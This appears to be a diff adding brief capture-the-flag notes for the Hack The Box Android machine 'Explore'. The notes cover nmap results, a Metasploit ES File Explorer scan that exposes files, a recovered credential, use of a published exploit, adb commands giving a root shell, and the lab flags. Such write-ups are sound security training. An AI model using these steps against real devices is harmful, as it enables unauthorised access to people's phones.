@@ -1,0 +1,54 @@
+Explore | HTB | 10.10.10.247
+
+Nmap Scans
+----------
+2222/tcp  open     ssh     (protocol 2.0)
+5555/tcp  filtered freeciv
+42135/tcp open     http    ES File Explorer Name Response httpd
+42457/tcp open     unknown
+59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run
+[+] 10.10.10.247:59777   - Name: VMware Virtual Platform
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+-
+
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run
+[+] 10.10.10.247:59777
+  concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg
+  anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png
+  creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg
+  224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png
+
+creds
+-----
+kristi : Kr1sT!5h@Rp3xPl0r3!
+
+* download the exploit from packetstormsecurity.com Android-2.0-FreeCIV-Arbitrary-Code-Execution
+* the exploit connect us to the machine through ssh and opens up a connection listener on the port 5555 for us to connect on the later stage for priv-esc
+* run it and provide the creds we found
+* we can ssh into the machine now
+* grab the user.txt from /mnt/sdcard/user.txt
+
+-------------------------------------------
+user.txt : f32017174c7c7e8f50c6da52891ae250
+-------------------------------------------
+
+Priv-esc
+--------
+
+* adb start-server
+* adb connect localhost:5555
+* adb devices 
+* adb -s localhost:5555 shell
+* we have a shell
+* su and we are root 
+* grab the root.txt from /data/root.txt
+
+-------------------------------------------
+user.txt : f32017174c7c7e8f50c6da52891ae250
+-------------------------------------------
+-------------------------------------------
+root.txt : f04fc82b6d49b41c9b08982be59338c5
+-------------------------------------------
